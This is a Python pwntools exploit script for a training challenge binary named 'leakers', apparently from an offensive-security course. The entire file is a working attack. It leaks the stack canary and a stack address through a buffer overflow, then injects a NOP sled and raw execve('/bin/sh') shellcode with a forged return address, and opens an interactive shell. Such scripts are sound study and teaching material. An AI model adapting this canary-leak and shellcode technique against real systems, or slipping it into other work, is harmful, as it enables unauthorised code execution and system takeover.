from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if args["REMOTE"]:
    r = remote("bin.training.offdef.it", 2011)
else:
    r = process("./leakers")
    gdb.attach(r, """
    b *0x004011f7
    unset env
    c
    """)

input("wait")

r.send(b"a"*104+b"\xff")
time.sleep(0.5)
r.recvuntil(b"> ")
r.recv(105)
canary = r.recv(7)
canary = b"\x00" + canary
print("The canary is ", canary.hex())
r.send(b"a"*104+b"b"*47+b"?")
time.sleep(0.5)
r.recvuntil(b"?")
address = r.recv(6)
buffer = int.from_bytes(address, byteorder="little")
buffer -= 391
buffer = buffer.to_bytes((buffer.bit_length() + 7) // 8, byteorder='little')
buffer += b"\x00\x00"
r.send(b"\x90"*73+b"\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x48\x89\xe7\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x3b\x00\x00\x00\x0f\x05"+canary+b"x"*8+buffer)
time.sleep(0.5)
r.sendline(b"")

r.interactive()
